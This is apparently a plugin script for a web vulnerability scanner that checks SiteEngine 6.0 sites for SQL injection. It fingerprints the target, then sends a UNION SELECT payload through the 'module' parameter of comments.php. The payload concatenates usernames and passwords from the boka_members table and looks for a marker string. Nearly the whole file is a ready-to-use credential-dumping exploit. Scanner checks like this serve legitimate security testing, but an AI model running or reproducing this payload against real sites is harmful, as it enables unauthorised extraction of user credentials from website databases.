#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''  
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"admin/images/css.css")
        url+="comments.php?id=1&module=news+m,boka_newsclass+c+where+1=2+union+select+1,2,group_concat(username,0x4E56535F544553545F474F,password,0x3c62723e),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26+from+boka_members%23"
        r,c=requestUrl(http,expurl,ob['task_id'],ob['domain_id'])
        if c.find("siteengine")>=0:
            res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
            if res['status'] == '200' and content.find('NVS_TEST_GO')>=0:
                request = getRequest(url)
                response = getResponse(res)
                list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:SITEENGINE6.0SQLINJECITONSCRIPT.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:SITEENGINE6.0SQLINJECITONSCRIPT.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def